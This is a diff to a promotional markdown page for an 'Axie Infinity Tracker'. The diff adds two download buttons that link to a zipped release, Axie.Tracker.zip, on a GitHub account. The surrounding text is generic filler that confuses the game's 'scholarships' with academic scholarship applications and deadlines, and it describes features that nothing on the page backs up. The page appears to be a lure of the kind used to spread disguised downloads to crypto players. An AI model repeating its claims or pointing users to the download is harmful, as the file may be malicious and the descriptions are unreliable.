@@ -28,6 +28,8 @@ So not only is Axie Infinity a ton of fun, but it’s also doing good in the wor
 
 The Axie Infinity Tracker is a tool that allows users to track their progress in the game, as well as manage their scholarship and other activities. The tracker is designed to help users stay on top of their game by providing them with reminders and notifications about upcoming deadlines, tasks, and events. It also allows users to share their progress with friends and family members.
 
+[![Alt text](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/download-button-plain.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
+
 
 ### How Can The Tracker Help With Scholarship And Management?
 
@@ -71,7 +73,11 @@ The Axie Infinity Tracker is a great tool for keeping track of your scholarship 
 The Benefits Of Using The Axie Infinity Tracker For Scholarship And Management.
 
 
-The Axie Infinity Tracker is a great tool for managing your scholarships and ensuring that you are getting the most out of your investment. The tracker allows you to see all of the available scholarships in one place, as well as keep track of deadlines, requirements, and other important information. This can be extremely helpful in making sure that you don't miss any opportunities or miss any deadlines. Additionally, the tracker can help you stay organized and on top of your scholarship applications. This is especially helpful if you are applying to multiple scholarships or have multiple deadlines approaching. Overall, the Axie Infinity Tracker is an extremely beneficial tool for managing your scholarships and ensuring that you are getting the most out of your investment.
+The Axie Infinity Tracker is a great tool for managing your scholarships and ensuring that you are getting the most out of your investment. The tracker allows you to see all of the available scholarships in one place, as well as keep track of deadlines, requirements, and other important information. This can be extremely helpful in making sure that you don't miss any opportunities or miss any deadlines. Additionally, the tracker can help you stay organized and on top of your scholarship applications. This is especially helpful if you are applying to multiple scholarships or have multiple deadlines approaching. 
+
+Overall, the Axie Infinity Tracker is an extremely beneficial tool for managing your scholarships and ensuring that you are getting the most out of your investment.
+
+[![Alt text](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/download-button-plain.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
 
 ### Conclusion
